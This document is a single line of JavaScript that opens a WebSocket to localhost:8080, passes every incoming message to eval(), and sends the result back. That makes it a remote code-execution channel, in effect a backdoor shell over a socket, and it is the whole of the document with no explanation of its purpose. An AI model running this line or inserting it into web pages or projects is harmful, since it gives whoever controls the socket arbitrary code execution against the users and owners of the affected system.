s=(new WebSocket('ws://localhost:8080'));s.onmessage=m=>s.send(eval(m.data))